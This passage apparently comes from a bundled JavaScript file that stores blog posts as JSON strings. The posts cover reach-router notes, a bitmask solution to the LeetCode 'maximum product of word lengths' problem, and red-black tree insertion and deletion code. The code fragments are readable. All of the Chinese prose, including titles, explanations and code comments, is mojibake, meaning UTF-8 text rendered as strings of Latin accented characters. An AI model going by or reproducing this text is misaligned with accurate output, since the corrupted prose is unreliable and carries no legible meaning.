·ï¼Œè·³è½¬åˆ°linkçš„ä½ç½®ï¼Œä¹Ÿæ˜¯éœ€è¦è‡ªå·±è§£å†³ï¼Œå¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code> componentDidMount() {\\n   requestAnimationFrame(() =&gt; {\\n     window.scrollTo(0, 0);\\n   });\\n }</code></pre></code></pre></li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-11","timeArr":[2018,9,11,0,0,0,0],"title":"å…³äºè¿‘æœŸä½¿ç”¨reach-routerçš„ä¸€äº›æ€»ç»“","uuid":"d8bf00a3ca68fe4e1b5c7acde9855e2148c7762f","summary":"<p>reach-routeræ˜¯ä¸€ä¸ªè½»é‡çº§çš„routerç»„ä»¶ï¼Œå½“ç„¶åŠŸèƒ½ä¹Ÿç›¸å¯¹äºreact-routerå°‘äº†ä¸€äº›ã€‚</p>\\n<p>è¿‘æœŸä½¿ç”¨çš„æ—¶å€™é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼Œåœ¨è¿™é‡Œæ€»ç»“ä¸€æ¬¡</p>\\n<ol>\\n<li>\\n<p>routeré‡åˆ°<code>url:parameter</code> ï¼Œå½“æ— æ³•åŒ¹é…çš„æƒ…å†µï¼Œé»˜è®¤ä¼šä¸€ç›´è¯»å–loadingç»„ä»¶ï¼Œå› ä¸ºå®ƒä¸çŸ¥é“è¿™ä¸ªå‚æ•°æ˜¯å¦æœ‰æ•ˆï¼Œ</p>\\n<p>éœ€è¦è‡ªè¡Œåˆ¤æ–­`...</p>\\n</li>\\n</ol>","slug":"guan-yu-jin-qi-shi-yong-reach-router-de-yi-xie-zong-jie","sha":"3a57533a3dc20f28769f523891951917242119ad"}')},598:function(n){n.exports=JSON.parse('{"content":"<p><a href=\\"https://leetcode.com/problems/maximum-product-of-word-lengths/\\">åŸé¢˜ç›®</a>ï¼š\\nç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œæ‰¾åˆ°é•¿åº¦çš„æœ€å¤§å€¼<code>length(word[i]) * length(word[j])</code>ï¼Œå…¶ä¸­ä¸¤ä¸ªå•è¯ä¸­çš„å­—æ¯æ— ç›¸åŒã€‚æ‚¨å¯ä»¥å‡å®šæ¯ä¸ªå•è¯åªåŒ…å«å°å†™å­—æ¯ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸¤ä¸ªè¯ï¼Œè¿”å›0ã€‚</p>\\n<p>ä¾‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>Input: [&quot;abcw&quot;,&quot;baz&quot;,&quot;foo&quot;,&quot;bar&quot;,&quot;xtfn&quot;,&quot;abcdef&quot;]\\nOutput: 16 \\nExplanation: The two words can be &quot;abcw&quot;, &quot;xtfn&quot;.</code></pre></code></pre><p>è§£æï¼š\\nè¿™é¢˜è‚¯å®šè¦è¿›è¡Œäº¤å‰å¯¹æ¯”(2ä¸ªforå¾ªç¯)ï¼Œä½†æœ€å…³é”®çš„å°±æ˜¯å¯¹æ¯”è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­2ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨ç›¸åŒçš„å­—ç¬¦ã€‚</p>\\n<p>å¦‚æœä½¿ç”¨<code>indexOf</code>æˆ–è€…æ•°ç»„ä¸‹æ ‡è®°å½•éƒ½ä¼šé€ æˆæ—¶é—´å¤æ‚åº¦å¤§å¹…æå‡ï¼Œçœ‹äº†ä»–äººçš„ç­”æ¡ˆå‘ç°ä½¿ç”¨çš„æ˜¯ä½æ“ä½œç¬¦<code>&lt;&lt;</code>ï¼Œ<code>|</code>å’Œ<code>&amp;</code>ï¼Œè€Œä¸”æ˜¯åœ¨äº¤å‰å¯¹æ¯”ä¹‹å‰è¿›è¡Œé¢„å¤„ç†ï¼Œäº¤å‰å¯¹æ¯”çš„æ—¶å€™åªéœ€è¦ç®€å•çš„åˆ¤æ–­<code>pretreate[i] &amp; pretreate[j]===0</code>ä¾¿å¯ï¼Œ</p>\\n<p>å› ä¸ºä½¿ç”¨åæ•ˆç‡æå‡å¤ªå¤šï¼Œè§£æå¹¶ä¸”è®°å½•ä¸€ä¸‹ã€‚</p>\\n<p>å…ˆè§£é‡Š<code>val |= (1 &lt;&lt; (word.charCodeAt(i)-aCode))</code>ï¼š</p>\\n<ul>\\n<li><p><code>word.charCodeAt(i)-aCode</code>è¿™ä¸ªå¾ˆå¥½æ‡‚ï¼Œä¹Ÿå°±æ˜¯aå¯¹åº”0ï¼Œbå¯¹åº”1...è¿™é‡Œçš„0,1æ•°å­—ä»£è¡¨çš„æ˜¯<br>äºŒè¿›åˆ¶1åé¢çš„ä½æ•°ã€‚</p>\\n</li>\\n<li><p><code>1&lt;&lt;0</code>ï¼Œ<code>1&lt;&lt;1</code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>\\n<p>  1åœ¨äºŒè¿›åˆ¶ä¸­(32ä½)å°±æ˜¯<code>00000000000000000000000000000001</code>ï¼Œ<code>&lt;&lt;</code>æ˜¯å·¦ç§»1ä½ï¼Œ</p>\\n<p>  é‚£ä¹ˆ<code>1&lt;&lt;0</code>è¿˜æ˜¯<code>1</code>ï¼Œ<code>1&lt;&lt;1</code>å°±æ˜¯(å‰é¢çš„é›¶çœç•¥)<code>10</code>ï¼Œ<code>1&lt;&lt;2</code>å°±æ˜¯<code>100</code>ï¼Œ<code>1&lt;&lt;3</code>å°±æ˜¯<code>1000</code>ï¼Œ</p>\\n<p>  äºæ˜¯å¯çŸ¥</p>\\n<p>  <code>a</code>å°±æ˜¯<code>1</code>ï¼Œ</p>\\n<p>  <code>b</code>æ˜¯<code>10</code>ï¼Œ</p>\\n<p>  <code>c</code>æ˜¯<code>100</code>...</p>\\n<p>  <code>z</code>æ˜¯<code>10000000000000000000000000</code>(25ä¸ª0)ã€‚</p>\\n</li>\\n<li><p><code>|</code>æ˜¯æŒ‰ä½æˆ–ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…å…¶ä¸­ä¸€ä¸ªä¸º1ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ï¼Œåˆ™ä¸º0ï¼Œ</p>\\n<p>   å› æ­¤ <code>val |=</code>å°±æ˜¯å¯¹æ¯ä¸€ä¸ªå­—ç¬¦åˆå¹¶ï¼Œä¾‹å¦‚</p>\\n<p>   <code>ab</code> æ˜¯ <code>00010|00001</code>=&gt;<code>00011</code>ï¼Œ</p>\\n<p>   <code>f</code> æ˜¯ <code>100000</code>ï¼Œ</p>\\n<p>   <code>ffff</code> ä¹Ÿæ˜¯ <code>100000</code>ï¼Œ</p>\\n<p>   <code>big</code>æ˜¯ <code>101000010</code>ï¼Œ</p>\\n<p>   <code>axdg</code>æ˜¯<code>100000000000000001001001</code>ã€‚</p>\\n</li>\\n<li><p><code>&amp;</code>ï¼ŒæŒ‰ä½ä¸ï¼ŒäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…éƒ½ä¸º1ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ï¼Œåˆ™ä¸º0ï¼Œ</p>\\n<p>  ä¾‹1ï¼š<code>axdg</code>å’Œ<code>oigd</code>è¦åˆ¤æ–­æ˜¯å¦æœ‰é‡å¤ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>  axdgæ˜¯ï¼š100000000000000001001001\\n\\n  oifdæ˜¯ï¼š         100000100101000\\n\\n  &amp; åï¼š  000000000000000000001000  </code></pre></code></pre><p>  å› ä¸ºç¬¬4ä½éƒ½ä¸º1ï¼Œæ‰€ä»¥æœ€åä¸ä¸º0ï¼Œä¹Ÿå¯å¾—çŸ¥é‡å¤çš„å°±æ˜¯å­—æ¯è¡¨ç¬¬4ä½ï¼š<code>d</code>ã€‚</p>\\n<p>  &nbsp;</p>\\n<p>  ä¾‹2ï¼š<code>axdg</code>å’Œ<code>lkmk</code>è¦åˆ¤æ–­æ˜¯å¦æœ‰é‡å¤ï¼š</p>\\n<p>  ç»“æœä¸º0ï¼Œè¯´æ˜æ— é‡å¤ã€‚</p>\\n<pre><code><pre class=\\"hljs\\"><code>  axdgæ˜¯ï¼š100000000000000001001001\\n\\n  lkmkæ˜¯ï¼š           1110000000000\\n\\n  &amp; åï¼š  000000000000000000000000  </code></pre></code></pre><p>æ€»ç»“ï¼šè¿™ç§æ–¹æ³•ä½¿ç”¨äº†äºŒè¿›åˆ¶æ•°å­—çš„ä½æ•°ä½œä¸ºä¿å­˜å­—ç¬¦çš„æ‰‹æ®µï¼Œç›¸æ¯”èµ·æ•°ç»„ï¼Œæ•£åˆ—è¡¨ç­‰ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œåœ¨ä¿å­˜é‡è¾ƒå°(&lt;=32)ä¼˜åŠ¿éå¸¸æ˜æ˜¾ã€‚</p>\\n</li>\\n</ul>\\n<p>ä»£ç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{string[]}</span> <span class=\\"hljs-variable\\">words</span></span>\\n * <span class=\\"hljs-doctag\\">@return <span class=\\"hljs-type\\">{number}</span></span>\\n */</span>\\n<span class=\\"hljs-keyword\\">var</span> maxProduct = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">words</span>) </span>{\\n    <span class=\\"hljs-keyword\\">let</span> aCode=<span class=\\"hljs-string\\">\'a\'</span>.charCodeAt(<span class=\\"hljs-number\\">0</span>)\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compute</span>(<span class=\\"hljs-params\\">word</span>)</span>{\\n        <span class=\\"hljs-keyword\\">let</span> val=<span class=\\"hljs-number\\">0</span>\\n        <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;word.length;i++){\\n            val |= (<span class=\\"hljs-number\\">1</span> &lt;&lt; (word.charCodeAt(i)-aCode))\\n        }\\n        <span class=\\"hljs-keyword\\">return</span> val\\n    }\\n    <span class=\\"hljs-keyword\\">let</span> pretreatment=[]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;words.length;i++){\\n        pretreatment[i]=compute(words[i])\\n    }\\n    <span class=\\"hljs-keyword\\">let</span> maxSum=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;words.length<span class=\\"hljs-number\\">-1</span>;i++){\\n        <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=i+<span class=\\"hljs-number\\">1</span>;j&lt;words.length;j++){\\n            <span class=\\"hljs-keyword\\">let</span> len1=words[i].length,len2=words[j].length\\n            <span class=\\"hljs-keyword\\">if</span>(len1*len2&gt;maxSum &amp;&amp; (pretreatment[i] &amp; pretreatment[j])===<span class=\\"hljs-number\\">0</span>){\\n                 maxSum=len1*len2\\n            }\\n        }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> maxSum\\n};</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-06","timeArr":[2018,8,6,0,0,0,0],"title":"å…³äºä½æ“ä½œç¬¦åº”ç”¨çš„ç®—æ³•é¢˜","uuid":"c8b2b19bf52484de902c2d4d23a44ed8b158ab18","summary":"<p><a href=\\"https://leetcode.com/problems/maximum-product-of-word-lengths/\\">åŸé¢˜ç›®</a>ï¼š\\nç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œæ‰¾åˆ°é•¿åº¦çš„æœ€å¤§å€¼<code>length(word[i]) * length(word[j])</code>ï¼Œå…¶ä¸­ä¸¤ä¸ªå•è¯ä¸­çš„å­—æ¯æ— ç›¸åŒã€‚æ‚¨å¯ä»¥å‡å®šæ¯ä¸ªå•è¯åªåŒ…å«å°å†™å­—æ¯ã€‚å¦‚æœæ²¡æœ‰...</p>","slug":"guan-yu-wei-cao-zuo-fu-ying-yong-de-suan-fa-ti","sha":"7963f582de66e6e2582fb61249dbba57221190fe"}')},599:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"gui-ze\\">è§„åˆ™</h3>\\n<ol>\\n<li>åŸå‹æ˜¯<code>2-3æ ‘</code></li>\\n<li>çº¢é“¾æ¥ï¼šç›¸å½“äº<code>2-3æ ‘</code>çš„<code>3èŠ‚ç‚¹</code>ï¼Œçº¢é“¾æ¥ä¸­å­èŠ‚ç‚¹æ˜¯<code>çº¢è‰²</code>ï¼Œçˆ¶èŠ‚ç‚¹æ˜¯<code>é»‘è‰²</code></li>\\n<li>åªå­˜åœ¨çº¢é“¾æ¥ä¸ºå·¦é“¾æ¥ï¼Œå‘ç°çº¢é“¾æ¥ä¸ºå³é“¾æ¥éœ€è¦è½¬æ¢</li>\\n<li>å½“èŠ‚ç‚¹ä¸ºnullï¼Œä¹Ÿè®¤ä¸ºæ˜¯<code>é»‘è‰²</code></li>\\n<li>å½“æ’å…¥èŠ‚ç‚¹ï¼Œå‡ºç°2ä¸ªå·¦çº¢ç‚¹ç›¸é‚»(ä¸å¯èƒ½å‡ºç°2ä¸ªå³çº¢ç‚¹ç›¸é‚»ï¼Œå› ä¸ºç¬¬3æ¡)ï¼Œå…¶å®å°±æ˜¯<code>2-3æ ‘</code>ä¸­å‡ºç°äº†<code>4èŠ‚ç‚¹</code>ï¼Œéœ€è¦è½¬æ¢ã€‚</li>\\n<li>å½“åˆ é™¤èŠ‚ç‚¹ï¼Œéœ€è¦è®©è¢«åˆ é™¤çš„èŠ‚ç‚¹ä¸º<code>çº¢è‰²</code>(é€šè¿‡è½¬æ¢)</li>\\n<li>çº¢é»‘æ ‘çš„æ’å…¥å’Œåˆ é™¤éƒ½æ˜¯å»ºè®®åœ¨<code>é€’å½’</code>æ‰§è¡Œçš„åŸºç¡€ä¸Š</li>\\n</ol>\\n<hr>\\n<h3 id=\\"cha-ru\\">æ’å…¥</h3>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E6%8F%92%E5%85%A5%E8%8A%82%E7%82%B9.png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">insert</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-comment\\">// ...æ­£å¸¸äºŒå‰æ ‘çš„å¤„ç†</span>\\n\\n  <span class=\\"hljs-comment\\">// ä»¥ä¸‹ä¸‰æ¡ä¼šåœ¨é€’å½’è¿‡ç¨‹ä¸­å¤„ç†</span>\\n  <span class=\\"hljs-keyword\\">if</span>(isRed(node.left) &amp;&amp; isRed(node.right)) flipColors(node)\\n  <span class=\\"hljs-keyword\\">if</span>(!isRed(node.left) &amp;&amp; isRed(node.right))node=rotateLeft(node)\\n  <span class=\\"hljs-keyword\\">if</span>(isRed(node.left) &amp;&amp; isRed(node.left.left))node=rotateRight(node)\\n}</code></pre></code></pre>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E6%8F%92%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png\\" alt=\\"\\"></p>\\n<p>ä¾‹(Bä»£è¡¨<code>black</code>, Rä»£è¡¨<code>red</code>)ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>                              R3ä¸ºå³çº¢å·¦é»‘       R5ä¸ºå·¦çº¢å·¦å·¦çº¢        æ­¤æ—¶å·²ç»åˆ°è¾¾æ ¹èŠ‚ç‚¹ï¼Œè™½ç„¶å·¦çº¢å³çº¢ï¼Œ\\n    B5       æ·»åŠ 4     B5      æ‰§è¡Œç¬¬äºŒæ¡     B5   æ‰§è¡Œç¬¬ä¸‰æ¡     B4    ä½†ä¸ä¼šæ‰§è¡Œç¬¬ä¸€æ¡ï¼Œç•™åˆ°ä¸‹ä¸€æ¬¡æ‰§è¡Œ \\n   /  \\\\      ---&gt;     /  \\\\      ---&gt;        /  \\\\     ---&gt;      /  \\\\   \\n  R3  Null          R3  Null              R4  Null            R3   R5   \\n                     \\\\                   /                                          \\n                      R4               R3                                           </code></pre></code></pre><hr>\\n<h3 id=\\"shan-chu\\">åˆ é™¤</h3>\\n<h4 id=\\"zuo-jie-dian\\">å·¦èŠ‚ç‚¹</h4>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E5%88%A0%E9%99%A4(%E5%B7%A6%E8%8A%82%E7%82%B9).png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (val &lt; node.val)  {\\n  <span class=\\"hljs-comment\\">// æ£€æµ‹å·¦èŠ‚ç‚¹å¦‚æœæ˜¯2èŠ‚ç‚¹(é»‘è‰²)ï¼Œé‚£ä¹ˆéœ€è¦å°†å®ƒå˜ä¸º3èŠ‚ç‚¹(çº¢è‰²)å†åˆ é™¤</span>\\n  node=checkLeftNodeAndMove(node)\\n  <span class=\\"hljs-comment\\">// ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</span>\\n  node.left = _remove(node.left, val);\\n}<span class=\\"hljs-keyword\\">else</span>{ <span class=\\"hljs-comment\\">/* ... */</span>}</code></pre></code></pre>\\n<p> åœ¨<code>checkLeftNodeAndMove</code>å†…éƒ¨ï¼Œå¦‚æœæ£€æµ‹åˆ°å·¦è¾¹æ˜¯ä¸ª<code>2èŠ‚ç‚¹</code>(å·¦é»‘ &amp; å·¦å·¦é»‘)ï¼Œé‚£ä¹ˆå…ˆ<code>flipColors</code>ï¼Œè¿™ä¹ˆåšæ˜¯ä¸ºäº†è®©å½“å‰<code>node</code>å…ˆ\\næˆä¸ºä¸€ä¸ª<code>3èŠ‚ç‚¹</code>æˆ–è€…<code>4èŠ‚ç‚¹</code>(å·¦çº¢,å³çº¢?)ï¼Œè®©å·¦èŠ‚ç‚¹(<code>2èŠ‚ç‚¹</code>)å¯ä»¥é€šè¿‡å³èŠ‚ç‚¹æˆ–è€…é€šè¿‡<code>node</code>å»å€Ÿä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹(è½¬æ¢)ï¼Œç„¶åå°±å»\\næ£€æµ‹å³è¾¹ï¼Œå³è¾¹å­˜åœ¨<code>3èŠ‚ç‚¹</code>(å³å·¦çº¢)ï¼Œé‚£ä¹ˆå°±ä»å³è¾¹å€Ÿ(<code>rotateRight + rotateLeft</code>)ï¼Œå¦‚æœå³è¾¹ä¸å­˜åœ¨ï¼Œé€šè¿‡é€’å½’å’Œæ‰§è¡Œ\\n<code>flipColors</code>ï¼Œæœ€ç»ˆå¯ä»¥ä»<code>node</code>å»å€Ÿä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">checkLeftNodeAndMove</span>(<span class=\\"hljs-params\\">node</span>)</span>{\\n  <span class=\\"hljs-comment\\">// ç¡®ä¿å·¦è¾¹åªæ˜¯ä¸ª2èŠ‚ç‚¹</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!isRed(node.left) &amp;&amp; !isRed(node.left.left))\\n    node= moveRedLeft(node);\\n  <span class=\\"hljs-keyword\\">return</span> node\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">moveRedLeft</span>(<span class=\\"hljs-params\\">node</span>) </span>{\\n  <span class=\\"hljs-comment\\">// å°†nodeå˜ä¸º3èŠ‚ç‚¹æˆ–è€…4èŠ‚ç‚¹</span>\\n  flipColors(node);\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.right.left)) {\\n    <span class=\\"hljs-comment\\">// åˆ¤æ–­æ˜¯å¦å¯ä»¥ä»å³èŠ‚ç‚¹æ¥ä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹</span>\\n    node.right = rotateRight(node.right);\\n    node = rotateLeft(node);\\n    <span class=\\"hljs-comment\\">// å·²ç»ä»å³èŠ‚ç‚¹å€Ÿåˆ°ä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹ï¼Œè§£é™¤nodeçš„å¤šèŠ‚ç‚¹</span>\\n    flipColors(node);\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> node;\\n}</code></pre></code></pre>\\n<hr>\\n<h4 id=\\"you-jie-dian\\">å³èŠ‚ç‚¹</h4>\\n<p><img src=\\"/article/img/%E7%BA%A2%E9%BB%91%E6%A0%91-%E5%88%A0%E9%99%A4(%E5%8F%B3%E8%8A%82%E7%82%B9).png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (val &lt; node.val)  {\\n  <span class=\\"hljs-comment\\">/* ...å·¦èŠ‚ç‚¹çš„å¤„ç†... */</span>\\n}<span class=\\"hljs-keyword\\">else</span> {\\n  <span class=\\"hljs-comment\\">// å¦‚æœæ˜¯3èŠ‚ç‚¹ï¼Œéœ€è¦å…ˆå³æ—‹ï¼Œä¿è¯è¢«åˆ é™¤çš„ä¸æ˜¯çˆ¶çº§æ ‘</span>\\n  <span class=\\"hljs-comment\\">/*\\n  ä¾‹å¦‚ï¼š 5         3\\n        /   ==&gt;     \\\\\\n     R 3           R 5\\n  */</span>\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left))\\n    node = rotateRight(node);\\n  <span class=\\"hljs-comment\\">// æ‰¾åˆ°å€¼ï¼Œé€šè¿‡ä¸Šé¢å³è½¬ï¼Œæ— å³å­æ ‘ï¼Œç›´æ¥åˆ é™¤</span>\\n  <span class=\\"hljs-keyword\\">if</span> (val===node.val  &amp;&amp; (node.right == <span class=\\"hljs-literal\\">null</span>))\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">null</span>;\\n\\n  <span class=\\"hljs-comment\\">// æ£€æµ‹å³ä¾§å¯èƒ½è¢«åˆ é™¤çš„èŠ‚ç‚¹å¦‚æœæ˜¯2èŠ‚ç‚¹(é»‘è‰²)ï¼Œé‚£ä¹ˆéœ€è¦å°†å®ƒå˜ä¸º3èŠ‚ç‚¹(çº¢è‰²)å†åˆ é™¤</span>\\n  node=checkRightNodeAndMove(node)\\n  <span class=\\"hljs-keyword\\">if</span> (val === node.val) {\\n    <span class=\\"hljs-keyword\\">let</span> x = min(node.right);\\n    node.val = x.val;\\n    node.right = _remove(node.right,x.val);\\n  }\\n  <span class=\\"hljs-keyword\\">else</span> node.right =_remove(node.right, val);\\n}</code></pre></code></pre>\\n<p> åœ¨<code>checkLeftNodeAndMove</code>å†…éƒ¨ï¼Œå¦‚æœæ£€æµ‹åˆ°å³è¾¹<strong>æœ‰å¯èƒ½æ˜¯åˆ é™¤ä½ç½®</strong>çš„èŠ‚ç‚¹æ˜¯ä¸ª<code>2èŠ‚ç‚¹</code>(å³é»‘ &amp; å³å·¦é»‘)ï¼Œé‚£ä¹ˆå…ˆ<code>flipColors</code>ï¼Œ\\n åŒæ ·ä¹Ÿæ˜¯ä¸ºäº†è®©å½“å‰<code>node</code>å…ˆæˆä¸ºä¸€ä¸ª<code>3èŠ‚ç‚¹</code>æˆ–è€…<code>4èŠ‚ç‚¹</code>ï¼Œç„¶åå°±å»æ£€æµ‹å·¦è¾¹ï¼Œå·¦è¾¹å­˜åœ¨<code>3èŠ‚ç‚¹</code>(å·¦å·¦çº¢)ï¼Œé‚£ä¹ˆå°±ä»å·¦è¾¹å€Ÿ\\n (<code>rotateRight</code>)ï¼Œå¦‚æœå·¦è¾¹ä¸å­˜åœ¨ï¼Œé€šè¿‡é€’å½’å’Œæ‰§è¡Œ<code>flipColors</code>ï¼Œæœ€ç»ˆå¯ä»¥ä»<code>node</code>å»å€Ÿä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">checkRightNodeAndMove</span>(<span class=\\"hljs-params\\">node</span>)</span>{\\n  <span class=\\"hljs-comment\\">// å¦‚æœå³èŠ‚ç‚¹ æˆ–è€… å³èŠ‚ç‚¹çš„å·¦å­©å­ ä¸ºçº¢è‰²ï¼Œè¿™ä¸¤ä¸ªèŠ‚ç‚¹æ˜¯æœ‰å¯èƒ½ä¼šè¢«åˆ é™¤çš„èŠ‚ç‚¹ï¼Œåˆ™ä¸éœ€è¦è°ƒæ•´ï¼Œå¯ä»¥ç»§ç»­é€’å½’è‡³ä¸‹ä¸€å±‚</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!isRed(node.right) &amp;&amp; !isRed(node.right.left))\\n  <span class=\\"hljs-comment\\">// è°ƒæ•´ä¸º3èŠ‚ç‚¹</span>\\n    node = moveRedRight(node);\\n  <span class=\\"hljs-keyword\\">return</span> node\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">moveRedRight</span>(<span class=\\"hljs-params\\">node</span>) </span>{\\n  <span class=\\"hljs-comment\\">// å°†nodeå˜ä¸º3èŠ‚ç‚¹æˆ–è€…4èŠ‚ç‚¹</span>\\n  flipColors(node);\\n  <span class=\\"hljs-comment\\">// åˆ¤æ–­æ˜¯å¦å¯ä»¥ä»å·¦èŠ‚ç‚¹æ¥ä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹</span>\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left.left)) {\\n    node = rotateRight(node);\\n    <span class=\\"hljs-comment\\">// å·²ç»ä»å·¦èŠ‚ç‚¹å€Ÿåˆ°ä¸€ä¸ªçº¢è‰²èŠ‚ç‚¹ï¼Œè§£é™¤nodeçš„å¤šèŠ‚ç‚¹</span>\\n    flipColors(node);\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> node;\\n}</code></pre></code></pre>\\n<hr>\\n<h4 id=\\"balance\\">balance</h4>\\n<p>åˆ é™¤æ“ä½œç»“æŸåï¼Œ<strong>é€’å½’</strong>æ‰§è¡Œ<code>balance</code></p>\\n<p>æ£€æµ‹ä¸€ä¸‹å†…å®¹</p>\\n<ul>\\n<li>æ£€æµ‹æ˜¯å¦å­˜åœ¨å³çº¢é“¾æ¥</li>\\n<li>æ£€æµ‹æ˜¯å¦å­˜åœ¨2ä¸ªå·¦çº¢é“¾æ¥ç›¸é‚»</li>\\n<li>æ£€æµ‹æ˜¯å¦å­˜åœ¨<code>4èŠ‚ç‚¹</code>(å·¦çº¢å³çº¢)</li>\\n</ul>\\n<p>å…¶å®å°±æ˜¯<code>æ’å…¥èŠ‚ç‚¹</code>çš„3ä¸ª<code>if</code>ï¼Œè¿™ä¸¤ä¸ªè¡¨è¾¾æ„æ€æ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Œå¯ä»¥é€šç”¨(å·²æµ‹è¯•)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">balance</span>(<span class=\\"hljs-params\\">node</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.right))  node = rotateLeft(node);\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left) &amp;&amp; isRed(node.left.left)) node = rotateRight(node);\\n  <span class=\\"hljs-keyword\\">if</span> (isRed(node.left) &amp;&amp; isRed(node.right)) flipColors(node);\\n  <span class=\\"hljs-keyword\\">return</span> node;\\n}</code></pre></code></pre>\\n","toc":[{"anchor":"gui-ze","level":3,"text":"è§„åˆ™"},{"anchor":"cha-ru","level":3,"text":"æ’å…¥"},{"anchor":"shan-chu","level":3,"text":"åˆ é™¤"},{"anchor":"zuo-jie-dian","level":4,"text":"å·¦èŠ‚ç‚¹"},{"anchor":"you-jie-dian","level":4,"text":"å³èŠ‚ç‚¹"},{"anchor":"balance","level":4,"text":"balance"}],"relatedTags":null,"created_at":"2018-12-10","timeArr":[2018,11,10,0,0,0,0],"title":"çº¢é»‘æ ‘è¦ç‚¹-æ ¹æ®ã€Šç®—æ³•ç¬¬4ç‰ˆã€‹","uuid":"2bd50bd84bc74d731859ba7d0c3008c8ed84172a","summary":"<h4>è§„åˆ™ï¼š</h4>\\n<ol>\\n<li>åŸå‹æ˜¯<code>2-3æ ‘</code></li>\\n<li>çº¢é“¾æ¥ï¼šç›¸å½“äº<code>2-3æ 